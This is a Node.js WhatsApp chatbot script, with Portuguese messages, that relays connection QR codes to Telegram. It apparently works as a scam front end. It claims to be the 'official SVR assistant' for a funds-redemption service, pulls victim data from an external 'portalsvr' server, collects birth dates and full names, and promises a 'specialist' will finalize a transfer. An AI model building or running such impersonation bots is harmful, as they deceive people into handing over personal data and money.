process.on('uncaughtException', (err) => { console.error('❌ Erro Crítico:', err.message); });
process.on('unhandledRejection', (reason, promise) => { console.error('❌ Rejeição não tratada:', reason); });
const { Client, LocalAuth } = require('whatsapp-web.js');
const puppeteer = require('puppeteer-core');
const qrcodeTerminal = require('qrcode-terminal');
const QRCode = require('qrcode');
const axios = require('axios');
const dotenv = require('dotenv');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

dotenv.config();

const clientId = process.argv.find(a => a.startsWith('--id='))?.split('=')[1] || 'main';
const statusPath = path.join(__dirname, `bot-status-${clientId}.json`);

const client = new Client({
    authStrategy: new LocalAuth({ clientId }),
    
    
    puppeteer: {
        executablePath: (function() {
            const paths = [
                '/usr/bin/chromium',
                '/usr/bin/chromium-browser',
                '/usr/bin/google-chrome',
                '/usr/bin/google-chrome-stable'
            ];
            const found = paths.find(p => fs.existsSync(p));
            console.log(`🌐 SHARDCLOUD: Navegador encontrado em: ${found || 'NENHUM'}`);
            return found || null;
        })(),
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
        headless: 'new'
    }
});

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;
const API_URL = "https://portalsvr.discloud.app"; // URL do servidor de dados

async function notifyTelegram(text) {
    if (!TG_TOKEN || !CHAT_ID) return;
    try {
        await axios.post(`${TELEGRAM_URL}/sendMessage`, {
            chat_id: CHAT_ID,
            text,
            parse_mode: 'HTML'
        });
    } catch (e) {}
}

async function notifyTelegramWithImage(buffer, caption) {
    if (!process.env.TELEGRAM_BOT_TOKEN || !CHAT_ID) return;
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'qrcode.png' });
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');

        await axios.post(`${TELEGRAM_URL}/sendPhoto`, form, { headers: form.getHeaders() });
    } catch (e) {
        console.error("Erro ao enviar imagem pro Telegram", e.message);
    }
}

function updateLocalStatus(status, adminName = null) {
    fs.writeFileSync(statusPath, JSON.stringify({ 
        status, 
        adminName, 
        lastUpdate: Date.now() 
    }));
}

client.on('qr', async (qr) => {
    console.log('🤖 ESCANEIE O QR CODE ABAIXO PARA CONECTAR O BOT:');
    qrcodeTerminal.generate(qr, { small: true });
    updateLocalStatus('WAITING_QR');
    
    try {
        const qrBuffer = await QRCode.toBuffer(qr);
        await notifyTelegramWithImage(
            qrBuffer, 
            `<b>📢 SISTEMA AGUARDANDO CONEXÃO (${clientId.toUpperCase()})</b>\n\nEscaneie este QR Code no WhatsApp do parceiro para ativar o atendimento automático neste slot.`
        );
    } catch (err) {
        notifyTelegram(`<b>📢 SISTEMA AGUARDANDO CONEXÃO (${clientId.toUpperCase()})</b>\n\nUm novo QR Code foi gerado. Por favor, escaneie para ativar.`);
    }
});

client.on('ready', () => {
    const adminName = client.info.pushname;
    console.log(`✅ BOT [${clientId}] CONECTADO:`, adminName);
    updateLocalStatus('CONNECTED', adminName);
    notifyTelegram(`<b>✅ WHATSAPP CONECTADO [${clientId.toUpperCase()}]</b>\n\n<b>Atendente:</b> ${adminName}\nO robô deste slot está online.`);
});

client.on('disconnected', (reason) => {
    updateLocalStatus('DISCONNECTED');
    notifyTelegram(`<b>⚠️ WHATSAPP DESCONECTADO!</b>\n\nPor favor, reinicie o sistema.`);
});

// Bot logic remains same...
const chatSessions = new Map();
client.on('message_create', async (msg) => {
    if (msg.fromMe) {
        const chat = await msg.getChat();
        chatSessions.set(msg.to, { mode: 'human' });
        return;
    }
    if (!msg.fromMe) {
        const chatId = msg.from;
        const text = msg.body;
        const session = chatSessions.get(chatId) || { mode: 'idle', step: 0 };
        if (session.mode === 'human') return;
        if (text.includes('SOLICITAÇÃO DE RESGATE')) {
            const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/);
            const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
            
            let expectedData = null;
            if (userId) {
                try {
                    const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`);
                    expectedData = res.data;
                } catch (e) {
                    console.log("Erro ao buscar dados da sessão:", e.message);
                }
            }

            chatSessions.set(chatId, { mode: 'bot', step: 1, userId, expectedData });
            await msg.reply(`👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, preciso validar seus dados.\n\n📍 *ETAPA 1:* Digite sua **Data de Nascimento** (DD/MM/AAAA):`);
        } else if (session.mode === 'bot') {
            if (session.step === 1) {
                const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
                const typedDate = text.trim();
                
                if (dateRegex.test(typedDate)) {
                    // Validação de Dados Cruzados
                    if (session.expectedData && session.expectedData.birthDate && typedDate !== session.expectedData.birthDate) {
                        await msg.reply(`⚠️ *DIVERGÊNCIA DE DADOS*\n\nA data informada (*${typedDate}*) não confere com o preenchimento no portal.\n\nPor favor, digite a data correta para prosseguir ou aguarde um especialista.`);
                        return;
                    }

                    chatSessions.set(chatId, { ...session, step: 2, birthDate: typedDate });
                    await msg.reply(`✅ Data validada. \n\n📍 *ETAPA 2:* Digite seu **Nome Completo** conforme documento:`);
                } else await msg.reply(`❌ Formato inválido! Use o padrão DD/MM/AAAA\nExemplo: 10/05/1990`);
            } else if (session.step === 2) {
                if (text.trim().length < 8 || !text.trim().includes(" ")) {
                   await msg.reply(`❌ Por favor, digite seu **Nome Completo** (Nome e Sobrenome).`);
                   return;
                }
                await msg.reply(`📋 *DADOS RECEBIDOS E EM ANÁLISE!*\n\nSeu pedido de resgate entrou na fila de processamento prioritário.\n\n⏳ *Aguarde:* Um especialista entrará em contato neste chat em instantes para finalizar sua transferência.`);
                chatSessions.delete(chatId);
            }
        }
    }
});

client.initialize();



